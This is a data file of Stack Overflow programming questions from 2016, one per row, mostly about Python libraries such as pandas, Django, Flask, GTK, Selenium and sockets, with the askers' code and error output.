40031794,5597929.0,2016-10-13 22:04:27+00:00,2,Filling a Pandas DataFrame row by row,"<p>I am scraping a table from a website and want to create a pandas dataframe out of that. My question is what is the best method to achieve this in terms of efficiency / best practice?</p>

<p>What I have done is while scraping, append items to several lists to represent the columns. Once I'm done parsing the table from the website, I create the DataFrame and assign the lists to column names. See below:</p>

<pre><code>zip_df = pd.DataFrame(index=zip_codes)
zip_df['Latitude'] = latitudes
zip_df['Longitude'] = longitudes
</code></pre>

<p>There seems to be many different ways to approach this (e.g. <a href=""http://stackoverflow.com/questions/17091769/python-pandas-fill-a-dataframe-row-by-row"">Python pandas: fill a dataframe row by row</a>). Is the way I am doing it most logical? Or are there better approaches?</p>
"
39654060,6868511.0,2016-09-23 06:32:35+00:00,2,Trying to create a crude send/receive through TCP in python,"<p>So far I can send files to my ""fileserver"" and retrieve files from there as well. But i can't do both at the same time. I have to comment out one of the other threads for them to work. As you will see in my code.</p>

<p>SERVER CODE
</p>

<pre class=""lang-py prettyprint-override""><code>from socket import *
import threading
import os

# Send file function
def SendFile (name, sock):
filename = sock.recv(1024)      
  if os.path.isfile(filename):    
    sock.send(""EXISTS "" + str(os.path.getsize(filename))) 
    userResponse = sock.recv(1024)      
    if userResponse[:2] == 'OK':        
        with open(filename, 'rb') as f:
            bytesToSend = f.read(1024)
            sock.send(bytesToSend)
            while bytesToSend != """":   
                bytesToSend = f.read(1024)
                sock.send(bytesToSend)
else:                                   
    sock.send('ERROR')

sock.close()

def RetrFile (name, sock):
  filename = sock.recv(1024)      
  data = sock.recv(1024)                     
     if data[:6] == 'EXISTS':            
       filesize = long(data[6:])       
       sock.send('OK')
       f = open('new_' + filename, 'wb')      
       data = sock.recv(1024)
       totalRecieved = len(data)               
       f.write(data)
       while totalRecieved &lt; filesize:         
         data = sock.recv(1024)
         totalRecieved += len(data)
         f.write(data)

sock.close()



myHost = ''                             
myPort = 7005                           

s = socket(AF_INET, SOCK_STREAM)     
s.bind((myHost, myPort))             

s.listen(5)

print(""Server Started."")

while True:                             

connection, address = s.accept()
print(""Client Connection at:"", address)

#    u = threading.Thread(target=RetrFile, args=(""retrThread"", connection))
t = threading.Thread(target=SendFile, args=(""sendThread"", connection))     
#    u.start()
t.start()


s.close()
</code></pre>

<p>CLIENT CODE</p>

<pre class=""lang-py prettyprint-override""><code>from socket import *
import sys
import os

servHost = ''                          
servPort = 7005                         

s = socket(AF_INET, SOCK_STREAM)        
s.connect((servHost, servPort))         

decision = raw_input(""do you want to send or retrieve a file?(send/retrieve): "")

if decision == ""retrieve"" or decision == ""Retrieve"":
  filename = raw_input(""Filename of file you want to retrieve from server: "")      # ask user for filename
  if filename != ""q"":                     
     s.send(filename)                    
     data = s.recv(1024)                 
     if data[:6] == 'EXISTS':           
        filesize = long(data[6:])       
        message = raw_input(""File Exists, "" + str(filesize)+""Bytes, download?: Y/N -&gt; "")    

        if message == ""Y"" or message == ""y"":
            s.send('OK')
            f = open('new_' + filename, 'wb')       
            data = s.recv(1024)                     
            totalRecieved = len(data)               
            f.write(data)
            while totalRecieved &lt; filesize:         
                data = s.recv(1024)
                totalRecieved += len(data)
                f.write(data)
                print(""{0: .2f}"".format((totalRecieved/float(filesize))*100)) + ""% Done"" # print % of download progress

            print(""Download Done!"")

    else:
        print(""File does not exist!"")
s.close()

elif decision == ""send"" or decision == ""Send"":
filename = raw_input(""Filename of file you want to send to server: "")
if filename != ""q"":
    s.send(filename)                    
    if os.path.isfile(filename):    
        s.send(""EXISTS "" + str(os.path.getsize(filename))) 
        userResponse = s.recv(1024)      
        if userResponse[:2] == 'OK':
            with open(filename, 'rb') as f: 
                bytesToSend = f.read(1024)
                s.send(bytesToSend)
                while bytesToSend != """":    
                    bytesToSend = f.read(1024)
                    s.send(bytesToSend)
    else:                                   
        s.send('ERROR')

s.close()


s.close()
</code></pre>

<p>I'm still new to programming, so this is quite tough for me. All in all i'm just trying to figure out how to send AND receive files without having to comment out the bottom threads in my SERVER CODE.</p>

<p>Please and thank you! </p>
"
40032039,915713.0,2016-10-13 22:25:35+00:00,2,Pandas groupby-apply: weird behavior with series,"<p>Can some explain why groupby-apply on similar dataframes yields different results?</p>

<p>The 'p1' column of pred2 is converted to float and is loosing relevant information.</p>

<pre><code>import pandas as pd

def predictions(tool):
    out = pd.Series(index=['p1', 'p2', 'useTime'], dtype=object)
    if 'step1' in list(tool.State):
        out['p1'] = str(tool[tool.State == 'step1'].Machine.values[0])
    if 'step2' in list(tool.State):
        out['p2'] = str(tool[tool.State == 'step2'].Machine.values[0])
        out['useTime'] = str(tool[tool.State == 'step2'].oTime.values[0])
    return out


df1 = pd.DataFrame({'Key': ['B', 'B', 'A', 'A'],
                   'State': ['step1', 'step2', 'step1', 'step2'],
                   'oTime': ['', '2016-09-19 05:24:33', '', '2016-09-19 23:59:04'],
                   'Machine': ['23', '36L', '36R', '36R']})

df2 = df1.copy()
df2.oTime = pd.to_datetime(df2.oTime)


pred1 = df1.groupby('Key').apply(predictions)
pred2 = df2.groupby('Key').apply(predictions)

print(pred1)
print(pred2)
</code></pre>

<p>The output is as follows:</p>

<pre><code>      p1   p2              useTime
Key                               
A    36R  36R  2016-09-19 23:59:04
B     23  36L  2016-09-19 05:24:33
       p1   p2                        useTime
Key                                          
A     NaN  36R  2016-09-19T23:59:04.000000000
B    23.0  36L  2016-09-19T05:24:33.000000000
</code></pre>

<p>Note the difference in the p1 column, even though df1 and df2 are nearly the same except for a third column being converted to timeStamp.</p>

<p><a href=""https://github.com/pandas-dev/pandas/issues/14423"" rel=""nofollow"">https://github.com/pandas-dev/pandas/issues/14423</a></p>
"
40090892,6817245.0,2016-10-17 16:01:11+00:00,2,Check failed: error == cudaSuccess (2 vs. 0) out of memory,"<p>I am trying to run a neural network with pycaffe on gpu.</p>

<p>This works when I call the script for the first time.
When I run the same script for the second time, CUDA throws the error in the title.</p>

<p>Batch size is 1, image size at this moment is 243x322, the gpu has 8gb RAM.</p>

<p>I guess I am missing a command that resets the memory?</p>

<p>Thank you very much!</p>

<p>EDIT: </p>

<p>Maybe I should clarify a few things: I am running caffe on windows. </p>

<p>When i call the script with python script.py, the process terminates and the gpu memory gets freed, so this works.</p>

<p>With ipython, which I use for debugging, the GPU memory indeed does not get freed (after one pass, 6 of the 8 bg are in use, thanks for the nvidia-smi suggestion!)</p>

<p>So, what I am looking for is a command I can call from within pyhton, along the lines of:</p>

<p>run network</p>

<p>process image output</p>

<p><strong>free gpu memory</strong></p>
"
40030362,2723494.0,2016-10-13 20:27:31+00:00,2,Embedding a range in a pandas series,"<p>I have a table of 14 columns and I want to pull select ones into a new dataframe. 
Let's say I want column 0 then column 8-14</p>

<pre><code>  dfnow = pd.Series([df.iloc[row_count,0], \
                    df.iloc[row_count,8], \
                    df.iloc[row_count,9], \
                    ....
</code></pre>

<p>Works but seems clumsy</p>

<p>I'd like to write </p>

<pre><code>  dfnow = pd.Series([df.iloc[row_count,0], \
          df.iloc[row_count, range (8, 14)]])
</code></pre>

<p>But this throws a ValueError: Wrong number of items passed</p>

<p>Now, from the answer below, I know I can create two separate sereis and concatenate them, but that seems a little sub-optimal as well. </p>

<p><a href=""https://stackoverflow.com/questions/12504493/adding-pandas-series-with-different-indices-without-getting-nans"">Adding pandas Series with different indices without getting NaNs</a></p>
"
39650110,564979.0,2016-09-22 22:58:05+00:00,2,Group list of tuples by item,"<p>I have this list as example:</p>

<pre><code>[(148, Decimal('3.0')), (325, Decimal('3.0')), (148, Decimal('2.0')), (183, Decimal('1.0')), (308, Decimal('1.0')), (530, Decimal('1.0')), (594, Decimal('1.0')), (686, Decimal('1.0')), (756, Decimal('1.0')), (806, Decimal('1.0'))]
</code></pre>

<p>Now i want to group by the id, so I will use <code>itemgetter(0)</code>:</p>

<pre><code>import operator, itertools
from decimal import *
test=[(148, Decimal('3.0')), (325, Decimal('3.0')), (148, Decimal('2.0')), (183, Decimal('1.0')), (308, Decimal('1.0')), (530, Decimal('1.0')), (594, Decimal('1.0')), (686, Decimal('1.0')), (756, Decimal('1.0')), (806, Decimal('1.0'))]

for _k, data in itertools.groupby(test, operator.itemgetter(0)):
    print list(data) 
</code></pre>

<p>I don't know why but I am getting this wrong output:</p>

<pre><code>[(148, Decimal('3.0'))]
[(325, Decimal('3.0'))]
[(148, Decimal('2.0'))]
[(183, Decimal('1.0'))]
[(308, Decimal('1.0'))]
[(530, Decimal('1.0'))]
[(594, Decimal('1.0'))]
[(686, Decimal('1.0'))]
[(756, Decimal('1.0'))]
[(806, Decimal('1.0'))]
</code></pre>

<p>As you can see the output is not grouped by id. However the code above works fine if I use <code>itemgetter(1)</code>. The output is grouped by decimal val.</p>

<pre><code>[(148, Decimal('3.0')), (325, Decimal('3.0'))]
[(148, Decimal('2.0'))]
[(183, Decimal('1.0')), (308, Decimal('1.0')), (530, Decimal('1.0')), (594, Decimal('1.0')), (686, Decimal('1.0')), (756, Decimal('1.0')), (806, Decimal('1.0'))]
</code></pre>

<p>What I am missing here?</p>
"
39649709,6867161.0,2016-09-22 22:15:25+00:00,2,Add escape characters to a variable in Python,"<p>I need to add an escape character to a variable which I'm appending to another string and have it apply its effects. This is what I have:</p>

<pre><code>h1 = ['1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
h2 = ['1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']

h3 = list(itertools.product(h1, h2))
h4 = []

for item in h3:
    h4.append(''.join(item))

temp = r'\x' + str(h4[0]) + '\x7e\x15\x16\x28\xae\xd2\xa6\xab\xf7\x15\x88\x09\xcf\x4f\x3c'
</code></pre>

<p>So if i have \xh I need the character with hex value hh but I can't seem to find anything in python that does this besides \x which I can't seem to use on variables.</p>

<p>Any suggestions?</p>
"
40094823,6058547.0,2016-10-17 20:08:47+00:00,2,Django Rest Framework invalid username/password,"<p>Trying to do a simple '<strong>GET</strong>' wih admin credentials returns</p>

<blockquote>
  <p>""detail"": ""Invalid username/password.""</p>
</blockquote>

<p>I have a <em>custom user model</em> where I deleted the <strong>username</strong>, instead I use <strong>facebook_id</strong> :</p>

<pre><code>USERNAME_FIELD = 'facebook_id'
</code></pre>

<hr>

<p>I tried changing the <em>DEFAULT_PERMISSION_CLASSES</em>:</p>

<pre><code>('rest_framework.permissions.IsAuthenticated',), -- doesn't work!
('rest_framework.permissions.IsAdminUser',), -- doesn't work!
</code></pre>

<p>The only one that works is:</p>

<pre><code>('rest_framework.permissions.AllowAny',),
</code></pre>

<p>But I do not want that, since I'm building an API for a Mobile App</p>

<p>I also declared a <em>CustomUserAdmin</em> model and <em>CustomUserCreationForm</em> , apparently this was not the problem</p>

<hr>

<p>Help me understand what needs to be done to fix this annoying problem, I'm guessing it might have something to do with <strong>Permissions/Authentication</strong> or the fact that I CustomUserModel..</p>

<p>Also, let me know if there is a better way for a mobile app client to authenticate to the api</p>
"
39750041,1907997.0,2016-09-28 14:12:38+00:00,2,Python Gtk3 Window Icon from SVG / scalable icon from stock theme,"<p>How to set an high quality icon to Gtk.Window ?
My theme has SVG icons, but I always get an pixel size of 24 px. So what is wrong with my code? Would be very happy for some help. Thanks</p>

<p><a href=""http://i.stack.imgur.com/7L9p4.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/7L9p4.png"" alt=""enter image description here""></a></p>

<p><strong>Max size is always 24</strong>:</p>

<pre><code>#!/usr/bin/python3

import gi
gi.require_version('Gtk', '3.0')
from gi.repository import Gtk

window = Gtk.Window()
window.connect(""delete-event"", Gtk.main_quit)

icon_name = ""applications-mail""
icon_theme = Gtk.IconTheme.get_default()

found_icons = set()
for res in range(0, 512, 2):
    icon = icon_theme.lookup_icon(icon_name, res, 0)
    found_icons.add(icon.get_filename())
print(""\n"".join(found_icons))
sizes = Gtk.IconTheme.get_default().get_icon_sizes(icon_name)
max_size = max(sizes)
print(""max size = {} ({})"".format(max_size, sizes))
pixbuf = icon_theme.load_icon(icon_name, max_size, 0)
window.set_default_icon_list([pixbuf])

window.show_all()
Gtk.main()
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code>/usr/share/icons/Mint-X/categories/22/applications-mail.png
/usr/share/icons/Mint-X/categories/48/applications-mail.png
/usr/share/icons/Mint-X/categories/96/applications-mail.svg
/usr/share/icons/Mint-X/categories/32/applications-mail.png
/usr/share/icons/Mint-X/categories/16/applications-mail.png
/usr/share/icons/Mint-X/categories/24/applications-mail.png
max size = 24 ([22, 16, 24])
</code></pre>
"
39749242,6893857.0,2016-09-28 13:39:24+00:00,2,Python : why doesn't a.pop() modify the list (custom linked-list class),"<p>I'm trying to define a class Hlist of linked lists as below:</p>

<pre><code>class Hlist:

def __init__(self, value, hlnext):
    self.value = value
    self.hlnext = hlnext

def pop(self):
    res = self.value
    if not(self.hlnext == None):
        self = self.hlnext
    return res

def __repr__(self):
    return (str(self.value) + ' - ' +  str(self.hlnext))
</code></pre>

<p>When I test the pop() method on </p>

<pre><code>a = Hlist(1, Hlist(2, None))
</code></pre>

<p>Python returns 1 - 2 - None, ok. Then</p>

<pre><code>a.pop()
</code></pre>

<p>returns 1, fine. However : </p>

<pre><code>print(a)
</code></pre>

<p>returns 1 - 2 - None. The list hasn't been modified despite</p>

<pre><code>self = self.hlnext
</code></pre>

<p>Is self the pointer a or is it another pointer pointing to the same address as a?
And why does the following code return the expected answer for pop():</p>

<pre><code>class Hlist:

def __init__(self, value, hlnext):
    self.value = value
    self.hlnext = hlnext

def pop(self):
    res = self.value
    if not(self.hlnext == None):
        self.value = self.hlnext.value
        self.next = self.hlnext.hlnext
    return res

def __repr__(self):
    return (str(self.value) + ' - ' +  str(self.hlnext))
</code></pre>

<p>is it due to the setattr function used by python?</p>

<p>Actually i was trying to get the equivalent in Python of the following class in Java : </p>

<pre><code>class Hlist{
    int value;
    Hlist hlnext;

    Hlist(int value,Hlist hlnext){
        value = value;
        hlnext = hlnext;
    }
}
</code></pre>

<p>and add a pop() method to it. In a pop() method, will Java's <code>this</code> work the same way Python's <code>self</code> does (local variable) or will it be binded to the pointer a I called pop()? In that case, will <code>this = this.hlnext</code> change the <code>a</code> pointer or not?</p>
"
39749152,6139162.0,2016-09-28 13:35:41+00:00,2,concatenate excel datas with python or Excel,"<p>Here's my problem, I have an Excel sheet with 2 columns (see below)<a href=""http://i.stack.imgur.com/jMLBZ.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/jMLBZ.png"" alt=""enter image description here""></a></p>

<p>I'd like to print (on python console or in a excel cell) all the data under this form : </p>

<pre><code> ""1"" : [""1123"",""1165"", ""1143"", ""1091"", ""n""], *** n â [A2; A205]***
</code></pre>

<p>We don't really care about the Column B. But I need to add every postal code under this specific form. </p>

<p>is there a way to do it with Excel or in Python with Panda ? (If you have any other ideas I would love to hear them)</p>

<p>Cheers</p>
"
39748976,559827.0,2016-09-28 13:29:04+00:00,2,On the default/fill value for outer joins,"<p>Below are teeny/toy versions of much larger/complex dataframes I'm working with:</p>

<pre><code>&gt;&gt;&gt; A
  key         u         v         w         x
0   a  0.757954  0.258917  0.404934  0.303313
1   b  0.583382  0.504687       NaN  0.618369
2   c       NaN  0.982785  0.902166       NaN
3   d  0.898838  0.472143       NaN  0.610887
4   e  0.966606  0.865310       NaN  0.548699
5   f       NaN  0.398824  0.668153       NaN

&gt;&gt;&gt; B
  key         y         z
0   a  0.867603       NaN
1   b       NaN  0.191067
2   c  0.238616  0.803179
3   p  0.080446       NaN
4   q  0.932834       NaN
5   r  0.706561  0.814467
</code></pre>

<p>(FWIW, at the end of this post, I provide code to generate these dataframes.)</p>

<p>I want to produce an outer join of these dataframes on the <code>key</code> column<sup>1</sup>, in such a way that the new positions induced by the outer join get default value 0.0.  IOW, the desired result looks like this</p>

<pre><code>  key         u         v         w         x         y         z
0   a  0.757954  0.258917  0.404934  0.303313  0.867603       NaN
1   b  0.583382  0.504687       NaN  0.618369       NaN  0.191067
2   c       NaN  0.982785  0.902166       NaN  0.238616  0.803179
3   d  0.898838  0.472143       NaN  0.610887  0.000000  0.000000
4   e  0.966606   0.86531       NaN  0.548699  0.000000  0.000000
5   f       NaN  0.398824  0.668153       NaN  0.000000  0.000000
6   p  0.000000  0.000000  0.000000  0.000000  0.080446       NaN
7   q  0.000000  0.000000  0.000000  0.000000  0.932834       NaN
8   r  0.000000  0.000000  0.000000  0.000000  0.706561  0.814467
</code></pre>

<p>(Note that this desired output contains some NaNs, namely those that were already present in <code>A</code> or <code>B</code>.)</p>

<p>The <code>merge</code> method gets me part-way there, but the filled-in default values are NaN's, not 0.0's:</p>

<pre><code>&gt;&gt;&gt; C = pandas.DataFrame.merge(A, B, how='outer', on='key')
&gt;&gt;&gt; C
  key         u         v         w         x         y         z
0   a  0.757954  0.258917  0.404934  0.303313  0.867603       NaN
1   b  0.583382  0.504687       NaN  0.618369       NaN  0.191067
2   c       NaN  0.982785  0.902166       NaN  0.238616  0.803179
3   d  0.898838  0.472143       NaN  0.610887       NaN       NaN
4   e  0.966606  0.865310       NaN  0.548699       NaN       NaN
5   f       NaN  0.398824  0.668153       NaN       NaN       NaN
6   p       NaN       NaN       NaN       NaN  0.080446       NaN
7   q       NaN       NaN       NaN       NaN  0.932834       NaN
8   r       NaN       NaN       NaN       NaN  0.706561  0.814467
</code></pre>

<p>The <code>fillna</code> method fails to produce the desired output, because it modifies some positions that should be left unchanged:</p>

<pre><code>&gt;&gt;&gt; C.fillna(0.0)
  key         u         v         w         x         y         z
0   a  0.757954  0.258917  0.404934  0.303313  0.867603  0.000000
1   b  0.583382  0.504687  0.000000  0.618369  0.000000  0.191067
2   c  0.000000  0.982785  0.902166  0.000000  0.238616  0.803179
3   d  0.898838  0.472143  0.000000  0.610887  0.000000  0.000000
4   e  0.966606  0.865310  0.000000  0.548699  0.000000  0.000000
5   f  0.000000  0.398824  0.668153  0.000000  0.000000  0.000000
6   p  0.000000  0.000000  0.000000  0.000000  0.080446  0.000000
7   q  0.000000  0.000000  0.000000  0.000000  0.932834  0.000000
8   r  0.000000  0.000000  0.000000  0.000000  0.706561  0.814467
</code></pre>

<p>How can I achieve the desired output efficiently?  (Performance matters here, because I intend to perform this operation on much larger dataframes than those shown here.)</p>

<hr>

<p>FWIW, below is the code to generate the example dataframes <code>A</code> and <code>B</code>.</p>

<pre><code>from pandas import DataFrame
from collections import OrderedDict
from random import random, seed

def make_dataframe(rows, colnames):
    return DataFrame(OrderedDict([(n, [row[i] for row in rows])
                                 for i, n in enumerate(colnames)]))

maybe_nan = lambda: float('nan') if random() &lt; 0.4 else random()

seed(0)

A = make_dataframe([['a', maybe_nan(), maybe_nan(), maybe_nan(), maybe_nan()],
                    ['b', maybe_nan(), maybe_nan(), maybe_nan(), maybe_nan()],
                    ['c', maybe_nan(), maybe_nan(), maybe_nan(), maybe_nan()],
                    ['d', maybe_nan(), maybe_nan(), maybe_nan(), maybe_nan()],
                    ['e', maybe_nan(), maybe_nan(), maybe_nan(), maybe_nan()],
                    ['f', maybe_nan(), maybe_nan(), maybe_nan(), maybe_nan()]],
                   ('key', 'u', 'v', 'w', 'x'))

B = make_dataframe([['a', maybe_nan(), maybe_nan()],
                    ['b', maybe_nan(), maybe_nan()],
                    ['c', maybe_nan(), maybe_nan()],
                    ['p', maybe_nan(), maybe_nan()],
                    ['q', maybe_nan(), maybe_nan()],
                    ['r', maybe_nan(), maybe_nan()]],
                   ('key', 'y', 'z'))
</code></pre>

<hr>

<p><sup><sup>1</sup>For for case of <em>multi-key</em> outer joins, see <a href=""http://stackoverflow.com/q/39751636/559827"">here</a>.</sup></p>
"
39647824,1108761.0,2016-09-22 19:55:47+00:00,2,How would I confirm that a python package is installed using ansible,"<p>I am writing an <a href=""https://www.ansible.com/"" rel=""nofollow"">ansible</a> playbook, and I would first like to install <a href=""https://github.com/berdario/pew"" rel=""nofollow"">pew</a>, and transition into that pew environment in order to install some other python libraries.</p>

<p>So, my playbook is going to look something like this...</p>

<pre><code>tasks:

# task 1
- name: install pew if necessary
  command: pip install pew

# task 2
- name: create new pew environment if necessary
  command: pew new devpi-server

# task 3
- name: transition to pew environment
  command: pew workon devpi-server

# task 4
- name: install devpi-server
  command: pip install devpi-server

# task 5
- name: run devpi server
  command: devpi-server ## various args
</code></pre>

<p>In the spirit of keeping my playbook idempotent, I would like to do all of these tasks only if necesary.</p>

<p>So, I would only want to install pew if it isn't already installed, only want to create a new pew environment if it doesn't already exist, only workon the pew environment if we aren't already... etc etc...</p>

<p>Does anyone have good advice as to how to accomplish this? I am somewhat familiar with ansible conditionals, but only when it is something like, ""is a file downloaded or not""</p>

<p>I haven't had to determine yet if programs are installed, virtual environments are loaded, etc..</p>
"
39647977,6866642.0,2016-09-22 20:04:18+00:00,2,Capturing from a html POST form a model in Django,"<p>The truth i'm new to django and i would like to know how I can capture a value of an input type = hidden in a view of django, using request.POST [ 'address'] so that it can enter a value in my model in this case I want to fill my field direction but does not receive any data appears in the database as empty. This is the code I have so far:</p>

<p><strong>views.py</strong></p>

<pre><code>def formularioLleno(request):
    form = InformationForm()
    if request.method == 'POST':
        form = InformationForm(request.POST or None)
        if form.is_valid():
            form.ubicacion = request.POST['direccion']
            form.save()
            #return redirect('formas.index')
            return HttpResponseRedirect(reverse('index'))
        else:
            form = InformationForm()
    data = {
       'form': form,
    }
    return render_to_response('forma_form.html', data, context_instance=RequestContext(request))
</code></pre>

<p><strong>forms.py</strong></p>

<pre><code>from django import forms
from .models import forma
class InformationForm(forms.ModelForm):

    class Meta:
        model = forma
        fields = ('nombre', 'telefono')
</code></pre>

<p><strong>models.py</strong></p>

<pre><code>class forma(models.Model):
    nombre = models.CharField(verbose_name='nombre', max_length=50, unique=False)
    telefono = models.CharField(verbose_name='telefono', max_length=10, unique=False)
    ubicacion = models.CharField(verbose_name='ubicacion', max_length=15, unique=False)
</code></pre>

<p>forma_form.html</p>

<pre><code>&lt;div id=""formularios""&gt;
{% block form_content %}
    &lt;form action="""" method=""POST""&gt;
        {% csrf_token %}
        {{ form.as_p }}
        &lt;div id=""ubicacion""&gt;&lt;/div&gt;
        &lt;input type=""hidden"" id=""direccion"" name=""direccion"" value=""hello""&gt;
        &lt;button type=""submit"" onclick=""alerta()""&gt;Contactar&lt;/button&gt;
    &lt;/form&gt;

{% endblock form_content %}
</code></pre>

<p></p>
"
40027108,6439147.0,2016-10-13 17:11:19+00:00,2,Aborted connection error in flask,"<p>If the client closes an established connection that it has made with the <em>flask</em> server, I get the following error in the terminal:  </p>

<pre><code>[Errno 10053] An established connection was aborted by the software in your host machine
</code></pre>

<p>It seems when <em>flask</em> tries to write in the closed stream, it faces errors and hence will complain.<br>
It seemed like a warning or so as the application does not quit after printing the error, but the problem is that my server will stop serving other requests despite being alive in the system.  </p>

<p>I have read similar questions but they did not help. How can I prevent this issue? I use both Windows and Linux operating systems.</p>
"
39748092,5319229.0,2016-09-28 12:50:37+00:00,2,How to extract certain strings when they occur adjacently with BeautifulSoup,"<p>I'm parsing an HTML page's result from BeautifulSoup and the part(s) I'm interested in looks like this:</p>

<pre><code>&lt;i class=""fa fa-circle align-middle font-80"" style=""color: #45C414; margin-right: 15px""&gt;&lt;/i&gt;Departure for &lt;a href=""/en/ais/details/ports/17787/port_name:TEKIRDAG/_:3525d580eade08cfdb72083b248185a9"" title=""View details for: TEKIRDAG""&gt;TEKIRDAG&lt;/a&gt; &lt;/td&gt;
</code></pre>

<p>I'm interested in extracting the <code>port_name</code>, TEKIRDAG, however there are many port name's that are labeled identically. My question is is there a way to only extract <code>port_name</code> if it occers after the string <code>'Departure for'</code>?</p>
"
40027233,2336654.0,2016-10-13 17:19:08+00:00,2,access pandas axes by axis number,"<p>consider the <code>pd.Panel</code> <code>pn</code> and <code>pd.DataFrame</code> <code>df</code></p>

<pre><code>import pandas as pd
import numpy as np

pn = pd.Panel(np.arange(27).reshape(3, 3, 3), list('XYZ'), list('abc'), list('ABC'))

pn.to_frame().rename_axis('item', 1).unstack()
</code></pre>

<p><a href=""https://i.stack.imgur.com/3Gpon.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/3Gpon.png"" alt=""enter image description here""></a></p>

<pre><code>df = pd.DataFrame(np.arange(9).reshape(3, 3), list('abc'), list('ABC'))

df
</code></pre>

<p><a href=""https://i.stack.imgur.com/gyjvS.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/gyjvS.png"" alt=""enter image description here""></a></p>

<hr>

<p>I can access the <code>items</code> axis of <code>pn</code> with <code>pn.items</code> and the <code>columns</code> axis of <code>df</code> with <code>df.columns</code>.</p>

<p><strong><em>Question</em></strong><br>
But how do I get the <code>items</code> axis of <code>pn</code> with the number <code>0</code> and <code>minor_axis</code> axis with the number <code>2</code>?  With as many methods that accept the parameter <code>axis=0</code>, I'm imagining there is a straight forward way to access axes via number.</p>

<p><strong><em>What I've done</em></strong><br>
Custom function</p>

<pre><code>def get_axis(obj, axis=0):
    if isinstance(obj, pd.Panel):
        m = pd.Series(['items', 'major_axis', 'minor_axis'])
    else:
        m = pd.Series(['index', 'columns'])
    return obj.__getattribute__(m.loc[axis])

print(get_axis(pn, 2))
print(get_axis(pn, 1))
print(get_axis(pn, 0))
print(get_axis(df, 1))
print(get_axis(df, 0))
</code></pre>

<hr>

<pre><code>Index([u'A', u'B', u'C'], dtype='object')
Index([u'a', u'b', u'c'], dtype='object')
Index([u'X', u'Y', u'Z'], dtype='object')
Index([u'A', u'B', u'C'], dtype='object')
Index([u'a', u'b', u'c'], dtype='object')
</code></pre>
"
40027392,6906007.0,2016-10-13 17:28:47+00:00,2,same code diferent output in different pcs with python 3.5,"<p>I have this code:</p>

<pre><code>import gc

def hacerciclo():
    l=[0]
    l[0]=l

recolector=gc.collect()
print(""Garbage collector %d"" % recolector)
for i in range (10):
    hacerciclo()

recolector=gc.collect()
print(""Garbage collector %d"" % recolector)
</code></pre>

<p>This is an example code to the use of gc.collect(). The problem is that the same code shows different outputs in different computers.</p>

<p>One computers show:
Garbage collector 1
Garbage collector 10
others show:
Garbage collector 0
Garbage collector 10</p>

<p>Anyone knows why this happens? Thanks to everyone</p>
"
40027675,7015220.0,2016-10-13 17:45:13+00:00,2,Can't install Selenium WebDriver with Python,"<p>I am trying to install Selenium WebDriver with Python on my Mac. I used this command:</p>

<pre><code>sudo easy_install selenium
</code></pre>

<p>After that, I tried the following simple test:</p>

<p>python</p>

<pre><code>from selenium import webdriver
driver = webdriver.Firefox()
</code></pre>

<p>And I got the following error. What am I doing wrong?</p>

<blockquote>
  <p>Traceback (most recent call last):
    File """", line 1, in 
    File ""/Library/Python/2.7/site-packages/selenium-3.0.0.b3-py2.7.egg/selenium/webdriver/firefox/webdriver.py"", line 68, in <strong>init</strong>
      self.service.start() File ""/Library/Python/2.7/site-packages/selenium-3.0.0.b3-py2.7.egg/selenium/webdriver/common/service.py"", line 71, in start
      os.path.basename(self.path), self.start_error_message)
  selenium.common.exceptions.WebDriverException: Message: 'geckodriver' executable needs to be in PATH. </p>
</blockquote>
"
40028380,5012775.0,2016-10-13 18:28:22+00:00,2,"Random comma inserted at character 8192 in python ""json"" result called from node.js","<p>I'm a JS developer just learning python. This is my first time trying to use node (v6.7.0) and python (v2.7.1) together. I'm using restify with python-runner as a bridge to my python virtualenv. My python script uses a RAKE NLP keyword-extraction package.</p>

<p>I can't figure out for the life of me why my return data in <strong>server.js</strong> inserts a random comma at character 8192 and roughly multiples of. There's no pattern except the location; Sometimes it's in the middle of the object key string other times in the value, othertimes after the comma separating the object pairs. This completely breaks the JSON.parse() on the return data. Example outputs below. When I run the script from a python shell, this doesn't happen.</p>

<p>I seriously can't figure out why this is happening, any experienced devs have any ideas?</p>

<p><em>Sample output in browser</em></p>

<pre><code>[..., {...ate': 1.0, 'intended recipient': 4.,0, 'correc...}, ...]
</code></pre>

<p><em>Sample output in python shell</em></p>

<pre><code>[..., {...ate': 1.0, 'intended recipient': 4.0, 'correc...}, ...]
</code></pre>

<p><strong>DISREGARD ANY DISCREPANCIES REGARDING OBJECT CONVERSION AND HANDLING IN THE FILES BELOW. THE CODE HAS BEEN SIMPLIFIED TO SHOWCASE THE ISSUE</strong></p>

<p><strong>server.js</strong></p>

<pre><code>var restify = require('restify');
var py = require('python-runner');

var server = restify.createServer({...});

server.get('/keyword-extraction', function( req, res, next ) {

    py.execScript(__dirname + '/keyword-extraction.py', {
        bin: '.py/bin/python'
    })
    .then( function( data ) {
        fData = JSON.parse(data); &lt;---- ERROR
        res.json(fData);
    })
    .catch( function( err ) {...});

    return next();
});

server.listen(8001, 'localhost', function() {...});
</code></pre>

<p><strong>keyword-extraction.py</strong></p>

<pre><code>import csv
import json
import RAKE

f = open( 'emails.csv', 'rb' )
f.readline() # skip line containing col names

outputData = []

try:
    reader = csv.reader(f)

    for row in reader:
        email = {}
        emailBody = row[7]

        Rake = RAKE.Rake('SmartStoplist.txt')

        rakeOutput = Rake.run(emailBody)        

        for tuple in rakeOutput:

            email[tuple[0]] = tuple[1]

        outputData.append(email)

finally:
    file.close()

    print( json.dumps(outputData))
</code></pre>
"
40028498,1713185.0,2016-10-13 18:35:46+00:00,2,Pythonic way around Enums,"<p>What is the <em>pythonic</em> way to tell the caller of a function what values a given parameter supports?</p>

<p>He is an example for PyQt (for GUI). Say I have a checkbox, </p>

<pre><code>class checkbox(object):
    ....
    def setCheckState(self, value):
        ....
</code></pre>

<p>Here, <code>setCheckState()</code> should only expect <strong>checked</strong> or <strong>unchecked</strong>.</p>

<p>PyQt uses a built-in enumeration (i.e. <code>Qt.Checked</code> or <code>Qt.Unchecked</code>), but this is awful. I am constantly in the documentation looking for the enum for the object I am working with.</p>

